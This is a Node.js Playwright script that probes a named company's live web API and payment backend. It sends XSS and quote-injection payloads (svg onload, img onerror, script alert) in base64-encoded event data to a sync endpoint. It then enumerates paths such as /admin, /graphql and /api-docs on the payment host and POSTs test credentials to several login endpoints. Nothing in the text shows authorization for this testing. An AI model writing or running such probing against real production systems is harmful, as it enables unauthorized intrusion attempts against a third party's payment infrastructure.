const { chromium } = require('playwright');
(async () => {
  const browser = await chromium.launch({ headless: true });
  const page = await browser.newPage();
  const base = 'https://api-website.capital.com';
  
  // Test XSS/injection on service-point/sync
  const testCases = [
    { name: 'XSS in url param', url: 'https://capital.com/?x=<svg onload=alert(1)>' },
    { name: 'XSS in userAgent', userAgent: '<img src=x onerror=alert(1)>' },
    { name: 'XSS in eventName', eventName: '<script>alert(1)</script>' },
    { name: 'Quote injection in eventName', eventName: 'domReady";"test' },
  ];
  
  for (const tc of testCases) {
    const events = [{
      eventName: tc.eventName || 'domReady',
      timestamp: Date.now(),
      timezone: 0,
      type: 'test',
      url: tc.url || 'https://capital.com',
      userAgent: tc.userAgent || 'Mozilla/5.0',
      deviceId: 'test-device',
      requestId: 'test-request'
    }];
    
    const encoded = Buffer.from(JSON.stringify(events)).toString('base64');
    try {
      const r = await page.request.post(base + '/api/v2/service-point/sync', {
        data: encoded,
        headers: { 'Content-Type': 'application/json' },
        timeout: 5000
      });
      const t = await r.text();
      console.log(r.status() + ' | ' + tc.name + ' | ' + t.slice(0, 100));
    } catch (e) {
      console.log('ERR | ' + tc.name);
    }
  }
  
  // payment.backend-capital.com
  console.log('\n=== payment.backend-capital.com ===');
  const pay = 'http://payment.backend-capital.com';
  
  const paths = ['/', '/api', '/api/v1', '/health', '/status', '/login', '/admin', '/graphql', '/api-docs', '/api/health'];
  for (const p of paths) {
    try {
      const r = await page.request.get(pay + p, { timeout: 5000 });
      const sv = r.headers()['server'] || '';
      const ct = r.headers()['content-type'] || '';
      const t = await r.text();
      console.log(r.status() + ' | ' + sv.slice(0,15) + ' | ' + ct.slice(0,15) + ' | ' + p + ' => ' + t.slice(0, 60));
    } catch (e) {
      console.log('ERR | ' + p + ' | ' + e.message.slice(0, 40));
    }
  }
  
  // POST to payment backend
  const postPaths = ['/api/v1/login', '/login', '/api/auth', '/api/v1/auth'];
  for (const p of postPaths) {
    try {
      const r = await page.request.post(pay + p, {
        data: JSON.stringify({ email: 'test@test.com', password: 'test' }),
        headers: { 'Content-Type': 'application/json' },
        timeout: 5000
      });
      const t = await r.text();
      console.log(r.status() + ' | POST ' + p + ' => ' + t.slice(0, 100));
    } catch {}
  }
  
  await browser.close();
})().catch(e => { console.error(e.message); process.exit(1); });
